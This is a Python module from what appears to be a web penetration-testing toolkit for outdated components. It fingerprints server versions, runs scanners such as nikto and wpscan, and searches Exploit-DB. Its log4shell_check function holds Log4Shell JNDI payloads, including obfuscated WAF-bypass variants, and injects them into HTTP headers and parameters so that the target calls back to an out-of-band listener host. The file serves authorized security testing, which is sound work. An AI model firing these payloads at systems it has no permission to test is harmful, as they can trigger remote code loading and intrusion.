"""
modules/vulnerable_components.py
tmrswrr - A06: Vulnerable & Outdated Components
CVE scanning, dependency check, version fingerprinting
"""
import os
import re
import shutil

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    SOFT_WHITE,
    info,
    print_banner,
    prompt,
    run_and_print,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def version_fingerprint():
    section("VERSION FINGERPRINTING")
    url = _target()

    known_vulns = {
        "apache/2.2":    "Apache 2.2 EOL - CVE-2017-7679 mod_mime buffer overflow, Shellshock",
        "apache/2.4.49": "CVE-2021-41773 - Path traversal & RCE (CRITICAL)",
        "apache/2.4.50": "CVE-2021-42013 - Path traversal bypass (CRITICAL)",
        "nginx/1.14":    "Nginx 1.14 outdated - upgrade to 1.24+",
        "iis/6.0":       "IIS 6.0 EOL - CVE-2017-7269 RCE (CRITICAL)",
        "iis/7.5":       "IIS 7.5 - CVE-2017-0055",
        "php/5":         "PHP 5.x EOL - many unpatched CVEs",
        "php/7.0":       "PHP 7.0 EOL",
        "php/7.1":       "PHP 7.1 EOL",
        "php/7.2":       "PHP 7.2 EOL",
        "openssl/1.0":   "OpenSSL 1.0.x - POODLE, Heartbleed, many more",
        "wordpress/4":   "WordPress 4.x outdated - many plugin CVEs",
        "drupal/7":      "Drupal 7 - Drupalgeddon CVE-2018-7600",
        "joomla/3":      "Joomla 3.x - check for CVE-2023-23752",
        "spring/5.3":    "Spring Framework - CVE-2022-22965 Spring4Shell",
        "log4j":         "Log4j - CVE-2021-44228 Log4Shell (CRITICAL)",
        "struts/2":      "Apache Struts 2 - CVE-2017-5638 RCE (CRITICAL)",
        "jquery/1":      "jQuery 1.x - XSS CVEs",
        "jquery/2":      "jQuery 2.x - CVE-2019-11358 prototype pollution",
        "bootstrap/3":   "Bootstrap 3 - CVE-2019-8331 XSS",
    }

    info("Fingerprinting server versions from response headers...")
    out, _, _ = run_cmd(f"curl -sk -I {url} -L", timeout=10)
    print(f"\n{NEON_CYN}Response Headers:{RST}")
    print(out[:1500])

    lower = out.lower()
    for sig, advisory in known_vulns.items():
        if sig in lower:
            warn(f"VULNERABLE VERSION: {sig}")
            warn(f"  Advisory: {advisory}")
            add_vuln(f"Vulnerable Component: {sig}", "High", "A06:2021", advisory, url)

    if shutil.which("whatweb"):
        info("Running whatweb for deeper fingerprinting...")
        run_and_print(f"whatweb -a 3 {url} 2>/dev/null")


def nikto_scan():
    section("NIKTO VULNERABILITY SCAN")
    url = _target()

    if not shutil.which("nikto"):
        warn("nikto not found. Install: apt install nikto")
        return

    proxy = SESSION.get("proxy", "")
    proxy_flag = f"-useproxy {proxy}" if proxy else ""
    out = _out("nikto_vulncomp.txt")

    run_and_print(
        f"nikto -h {url} -Plugins 'headers;outdated;shellshock;headers' "
        f"{proxy_flag} -o {out} -Format txt",
        timeout=600
    )
    success(f"Saved → {out}")


def cms_scanner():
    section("CMS VULNERABILITY SCANNER")
    url = _target()
    print(f"""
  {NEON_CYN}[1]{RST} WPScan (WordPress)
  {NEON_CYN}[2]{RST} Droopescan (Drupal/Joomla/Moodle)
  {NEON_CYN}[3]{RST} CMSeeK (multi-CMS)
  {NEON_CYN}[4]{RST} Joomscan (Joomla)
  {NEON_GRN}[0]{RST} Back
""")
    c = prompt("Choice")

    if c == "1":
        if shutil.which("wpscan"):
            api = prompt("WPScan API token (optional, for CVE data)")
            api_flag = f"--api-token {api}" if api else ""
            out = _out("wpscan.txt")
            run_and_print(
                f"wpscan --url {url} {api_flag} --enumerate vp,vt,u,m "
                f"--output {out}",
                timeout=300
            )
        else:
            warn("wpscan not found. Install: gem install wpscan  or  docker run -it wpscanteam/wpscan")

    elif c == "2":
        if shutil.which("droopescan"):
            run_and_print(f"droopescan scan --url {url}", timeout=300)
        else:
            warn("droopescan not found. Install: pip install droopescan")

    elif c == "3":
        if shutil.which("cmseek"):
            out = _out("cmseek")
            run_and_print(f"cmseek -u {url} --batch -o {out}", timeout=300)
        else:
            warn("CMSeeK not found. Install: git clone https://github.com/Tuhinshubhra/CMSeeK")

    elif c == "4":
        if shutil.which("joomscan"):
            out = _out("joomscan.txt")
            run_and_print(f"joomscan -u {url} -o {out}", timeout=300)
        else:
            warn("joomscan not found. Install: apt install joomscan")


def js_dependency_check():
    section("JAVASCRIPT DEPENDENCY AUDIT")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    # Known vulnerable JS libraries patterns
    vuln_libs = {
        r"jquery[/-]?(\d+\.\d+\.?\d*)": {
            "1.": "jQuery < 3.x - CVE-2019-11358 prototype pollution, XSS vulnerabilities",
            "2.": "jQuery 2.x - CVE-2019-11358 prototype pollution",
            "3.0": "jQuery 3.0 - CVE-2019-11358",
            "3.1": "jQuery 3.1 - CVE-2019-11358",
            "3.2": "jQuery 3.2 - CVE-2019-11358",
            "3.3": "jQuery 3.3 - CVE-2019-11358",
            "3.4": "jQuery 3.4 - CVE-2020-11022/11023",
        },
        r"angular[/-]?(\d+\.\d+\.?\d*)": {
            "1.": "AngularJS 1.x - CVE-2019-14863 XSS",
        },
        r"react[/-]?(\d+\.\d+\.?\d*)": {
            "15.": "React 15 - outdated",
        },
        r"bootstrap[/-]?(\d+\.\d+\.?\d*)": {
            "3.": "Bootstrap 3 - CVE-2019-8331 XSS via data-template",
            "4.0": "Bootstrap 4.0 - CVE-2019-8331",
        },
    }

    # Fetch page source and extract script tags
    page_src, _, _ = run_cmd(f"curl -sk {url} -m 15")
    scripts = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', page_src, re.I)

    info(f"Found {len(scripts)} JS includes - checking for vulnerable versions...")
    print()
    for script in scripts:
        for pattern, versions in vuln_libs.items():
            m = re.search(pattern, script, re.I)
            if m:
                ver = m.group(1)
                for ver_prefix, advisory in versions.items():
                    if ver.startswith(ver_prefix):
                        warn(f"VULNERABLE JS LIB: {script}")
                        warn(f"  Version {ver}: {advisory}")
                        add_vuln(f"Vulnerable JS Library: {ver}", "Medium", "A06:2021",
                                 advisory, url)

    info("Script includes found:")
    for s in scripts[:20]:
        print(f"  {DIM}{s}{RST}")


def log4shell_check():
    section("LOG4SHELL - CVE-2021-44228 CHECK")
    url = _target()
    cookies = SESSION.get("cookies", "")

    info("Log4Shell detection via OOB DNS callback")
    collab = prompt("OOB listener hostname (Burp Collaborator / interactsh)")
    if not collab:
        warn("OOB listener required - cannot do blind Log4Shell detection without it")
        print(f"""
  {NEON_CYN}Log4Shell payloads to inject in all input fields:{RST}
    ${{jndi:ldap://COLLAB/a}}
    ${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://COLLAB/x}}  (WAF bypass)
    ${{jndi:dns://COLLAB/a}}
    ${{${{lower:j}}ndi:${{lower:ldap}}://COLLAB/a}}  (case bypass)
    ${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://COLLAB/a}}
""")
        return

    payload = f"${{jndi:ldap://{collab}/log4shell-test}}"
    headers_to_test = [
        "User-Agent",
        "X-Forwarded-For",
        "X-Api-Version",
        "X-Originating-IP",
        "Referer",
        "Accept-Language",
        "Authorization",
    ]

    import urllib.parse
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""
    encoded = urllib.parse.quote(payload)

    info(f"Injecting Log4Shell payload into {len(headers_to_test)} headers...")
    for hdr in headers_to_test:
        run_cmd(
            f'curl -sk "{url}" -H "{hdr}: {payload}" {cookie_flag} -m 5 -o /dev/null'
        )
        print(f"  {NEON_CYN}[→]{RST} Sent: {hdr}: {payload[:60]}")

    # Also test in GET/POST params
    run_cmd(f'curl -sk "{url}?test={encoded}" {cookie_flag} -m 5 -o /dev/null')
    print(f"  {NEON_CYN}[→]{RST} Sent in GET parameter: ?test=")

    success("All Log4Shell probes sent - monitor your OOB listener!")
    info(f"If you receive a DNS/LDAP callback to {collab}, Log4Shell is confirmed")


def searchsploit_scan():
    section("SEARCHSPLOIT - Exploit-DB Search")
    url = SESSION.get("target_url", "")
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-b "{cookies}"' if cookies else ""

    if not shutil.which("searchsploit"):
        warn("searchsploit not found. Install: apt install exploitdb")
        return

    # Get technology versions from fingerprint
    info("Fingerprinting target for searchsploit queries...")
    headers_out, _, _ = run_cmd(f'curl -sk -I {url} -m 8')
    page_out, _, _ = run_cmd(f'curl -sk {url} {cookie_flag} -m 10')
    combined = headers_out + page_out

    # Extract software + versions
    patterns = {
        "Server":          re.search(r"server:\s*(.+)", headers_out, re.I),
        "X-Powered-By":    re.search(r"x-powered-by:\s*(.+)", headers_out, re.I),
        "WordPress":       re.search(r"wordpress[\s/]+([\d.]+)", combined, re.I),
        "Drupal":          re.search(r"drupal[\s/]+([\d.]+)", combined, re.I),
        "Joomla":          re.search(r"joomla[\s/]+([\d.]+)", combined, re.I),
        "Apache":          re.search(r"apache/([\d.]+)", combined, re.I),
        "Nginx":           re.search(r"nginx/([\d.]+)", combined, re.I),
        "PHP":             re.search(r"php/([\d.]+)", combined, re.I),
        "IIS":             re.search(r"microsoft-iis/([\d.]+)", combined, re.I),
        "OpenSSL":         re.search(r"openssl/([\d.]+)", combined, re.I),
    }

    queries = []
    for name, match in patterns.items():
        if match:
            val = match.group(1).strip().split()[0]
            print(f"  {NEON_GRN}Found:{RST} {name} {val}")
            queries.append(f"{name} {val}")

    if not queries:
        manual = prompt("No tech detected - enter search term manually (e.g. 'Apache 2.4.49')")
        if manual:
            queries = [manual]

    for q in queries[:5]:
        print(f"\n  {NEON_CYN}searchsploit {q}{RST}")
        out, _, _ = run_cmd(f'searchsploit "{q}" --colour 2>/dev/null', timeout=15)
        if out and "No Results" not in out:
            print(out[:1000])
        else:
            print(f"  {DIM}No exploits found for: {q}{RST}")

    # Also search by CVE if found
    cves = re.findall(r'CVE-\d{4}-\d+', combined, re.I)
    for cve in cves[:3]:
        print(f"\n  {NEON_CYN}searchsploit --cve {cve}{RST}")
        out, _, _ = run_cmd(f'searchsploit --cve {cve} --colour 2>/dev/null', timeout=10)
        if out and "No Results" not in out:
            print(out[:500])
            add_vuln(f"Known Exploit: {cve}", "High", "A06:2021",
                     f"Exploit available in Exploit-DB for {cve}", url)


def run():
    print_banner("VULNERABLE & OUTDATED COMPONENTS", "A06:2021 - OWASP Top 10 #6")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} Version Fingerprinting & Known CVEs
  {NEON_CYN}[2]{RST} Nikto Full Vulnerability Scan
  {NEON_CYN}[3]{RST} CMS Scanner (WordPress/Drupal/Joomla)
  {NEON_CYN}[4]{RST} JavaScript Dependency Audit
  {NEON_CYN}[5]{RST} Log4Shell CVE-2021-44228 Check
  {NEON_CYN}[6]{RST} Searchsploit / Exploit-DB          {SOFT_WHITE}(auto-detect versions → exploit search){RST}
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            version_fingerprint()
        elif c == "2":
            nikto_scan()
        elif c == "3":
            cms_scanner()
        elif c == "4":
            js_dependency_check()
        elif c == "5":
            log4shell_check()
        elif c == "6":
            searchsploit_scan()
        save_session()
